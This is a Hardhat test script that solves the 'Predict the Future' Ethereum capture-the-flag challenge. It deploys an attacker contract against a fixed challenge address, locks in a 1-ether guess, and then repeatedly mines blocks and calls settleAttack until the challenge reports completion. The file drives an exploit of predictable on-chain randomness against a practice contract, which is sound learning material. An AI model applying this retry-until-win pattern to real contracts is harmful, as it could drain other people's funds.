import {ethers} from 'hardhat';
import {BigNumber, Contract, Signer} from 'ethers';
import {expect} from 'chai';
import {formatEtherscanTx} from '../utils/format';

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract
let attacker: Contract; // attacker contract

// Utilities methods
const increaseWorldTimeInSeconds = async (seconds: number, mine = false) => {
  await ethers.provider.send('evm_increaseTime', [seconds]);
  if (mine) {
    await ethers.provider.send('evm_mine', []);
  }
};

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];

  const factory = await ethers.getContractFactory('PredictTheFutureChallenge');

  contract = factory.attach(`0xE5424356a93f385AaB7795d15BcedA8Eeb2588a4`);

  const attackerFactory = await ethers.getContractFactory('PredictTheFutureChallengeAttacker');

  attacker = await attackerFactory.deploy(contract.address, {});
  console.log(`attacker deployed to -> ${attacker.address}`);

  // attacker = attackerFactory.attach(`0xA8baC02e4f749A7c1A823533c8031f557d5c1dbD`);
});

it('Guess the future number', async function () {
  //Develop the challenge here!
  const tx = await attacker.lockInAttack({value: ethers.utils.parseEther('1')});
  if (tx && tx.hash) {
    console.log(`attacker.lockInAttack -> ${formatEtherscanTx(tx.hash)}`);
  }
  console.log(await ethers.provider.getBlockNumber());
  // await increaseWorldTimeInSeconds(1, true);
  for (let i = 0; i < 1000; i++) {
    await increaseWorldTimeInSeconds(1, true);
    console.log(await ethers.provider.getBlockNumber());
    const tx2 = await attacker.settleAttack();
    const isCompleted = await contract.isComplete();
    if (isCompleted) {
      if (tx2 && tx2.hash) {
        console.log(`attacker.settleAttack -> ${formatEtherscanTx(tx2.hash)}`);
      }
      break;
    }
  }
  await increaseWorldTimeInSeconds(1, true);
  // Check the challenge result here!
  const completed = await contract.isComplete();
  expect(completed).to.be.true;
});
